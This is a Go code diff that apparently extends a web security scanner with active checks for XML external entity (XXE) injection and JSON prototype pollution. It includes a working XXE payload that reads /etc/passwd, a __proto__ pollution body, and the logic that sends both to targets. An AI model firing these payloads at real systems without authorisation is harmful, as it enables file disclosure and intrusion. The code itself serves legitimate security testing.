@@ -135,7 +135,8 @@ func RunActive(ctx context.Context, t Target, sender *repeater.Sender, oob OOBCl
 		return 0, err
 	}
 	points := req.insertionPoints()
-	if len(points) == 0 {
+	xmlApplicable := strings.Contains(req.contentType, "xml") || strings.HasPrefix(strings.TrimSpace(req.rawBodyRaw), "<")
+	if len(points) == 0 && !xmlApplicable && !req.isJSON {
 		return 0, fmt.Errorf("no insertion points (add query or form-body parameters to the request)")
 	}
 
@@ -221,6 +222,12 @@ func RunActive(ctx context.Context, t Target, sender *repeater.Sender, oob OOBCl
 	close(jobs)
 	wg.Wait()
 
+	// Special checks that operate on the whole request body, not insertion points.
+	if ctx.Err() == nil {
+		checkXXE(ctx, t, req, sender, report, &probes, &mu)
+		checkProtoPollution(ctx, t, req, sender, report, &probes, &mu)
+	}
+
 	// Resolve out-of-band checks: give callbacks a moment to arrive.
 	if len(pending) > 0 && oob != nil {
 		select {
@@ -244,6 +251,59 @@ type pendingOOB struct {
 	token    string
 	rule     Rule
 	evidence string
+}
+
+var passwdRe = regexp.MustCompile(`root:.*:0:0:`)
+
+// checkXXE tests XML-accepting endpoints for external entity injection.
+func checkXXE(ctx context.Context, t Target, req *request, sender *repeater.Sender, report func(Finding), probes *int, mu *sync.Mutex) {
+	isXML := strings.Contains(req.contentType, "xml") || strings.HasPrefix(strings.TrimSpace(req.rawBodyRaw), "<")
+	if !isXML {
+		return
+	}
+	payload := `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>`
+	raw := req.renderBody(payload)
+	resp := sender.Send(ctx, repeater.Request{Scheme: t.Scheme, Host: t.Host, Raw: raw})
+	mu.Lock()
+	*probes++
+	mu.Unlock()
+	if resp.Error == "" && passwdRe.MatchString(resp.Body) {
+		report(Finding{
+			Severity: High, Check: "xxe", Title: "XML External Entity (XXE) Injection",
+			Detail:   "An external entity referencing /etc/passwd was resolved and returned in the response.",
+			Evidence: "XXE payload returned file contents", Source: "active",
+			Key: "xxe|" + t.Host + "|" + req.path,
+		})
+	}
+}
+
+// checkProtoPollution tests JSON endpoints for prototype pollution using a
+// pollute-then-observe technique.
+func checkProtoPollution(ctx context.Context, t Target, req *request, sender *repeater.Sender, report func(Finding), probes *int, mu *sync.Mutex) {
+	if !req.isJSON {
+		return
+	}
+	// Baseline clean response.
+	base := sender.Send(ctx, repeater.Request{Scheme: t.Scheme, Host: t.Host, Raw: req.render(nil, "")})
+	// Send a polluting body.
+	polluted := `{"__proto__":{"ilxPolluted":"ILXPP1337"}}`
+	resp := sender.Send(ctx, repeater.Request{Scheme: t.Scheme, Host: t.Host, Raw: req.renderBody(polluted)})
+	mu.Lock()
+	*probes += 2
+	mu.Unlock()
+	if resp.Error != "" {
+		return
+	}
+	// Evidence: the marker is reflected as a new property that was absent in the
+	// baseline (indicating the prototype was polluted and leaked back).
+	if strings.Contains(resp.Body, "ILXPP1337") && !strings.Contains(base.Body, "ILXPP1337") {
+		report(Finding{
+			Severity: Medium, Check: "proto-pollution", Title: "Prototype Pollution",
+			Detail:   "A __proto__ payload was accepted and reflected as a new global property, indicating prototype pollution.",
+			Evidence: "injected __proto__.ilxPolluted appeared in the response", Source: "active",
+			Key: "proto-pollution|" + t.Host + "|" + req.path,
+		})
+	}
 }
 
 func probe(ctx context.Context, t Target, req *request, pt point, rule Rule, payload, baseline string,
@@ -358,6 +418,9 @@ type request struct {
 	headers []string // "Name: Value", Accept-Encoding/Content-Length/Cookie excluded
 	host    string
 
+	contentType string
+	rawBodyRaw  string // original body regardless of type
+
 	cookies  []cookiePair // parsed Cookie header
 	isForm   bool
 	body     url.Values
@@ -431,6 +494,8 @@ func parseRequest(raw string) (*request, error) {
 		r.headers = append(r.headers, name+": "+val)
 	}
 
+	r.contentType = contentType
+	r.rawBodyRaw = body
 	switch {
 	case strings.Contains(contentType, "application/x-www-form-urlencoded") && body != "":
 		r.isForm = true
@@ -525,6 +590,29 @@ func (r *request) render(pt *point, value string) string {
 	default:
 		sb.WriteString(r.rawBody)
 	}
+	return sb.String()
+}
+
+// renderBody rebuilds the raw request with body replaced (for XXE/PP payloads).
+func (r *request) renderBody(body string) string {
+	var sb strings.Builder
+	sb.WriteString(r.method + " " + r.path)
+	if len(r.query) > 0 {
+		sb.WriteString("?" + r.query.Encode())
+	}
+	sb.WriteString(" HTTP/1.1\r\n")
+	for _, h := range r.headers {
+		sb.WriteString(h + "\r\n")
+	}
+	if len(r.cookies) > 0 {
+		var parts []string
+		for _, c := range r.cookies {
+			parts = append(parts, c.name+"="+c.value)
+		}
+		sb.WriteString("Cookie: " + strings.Join(parts, "; ") + "\r\n")
+	}
+	sb.WriteString("\r\n")
+	sb.WriteString(body)
 	return sb.String()
 }
 
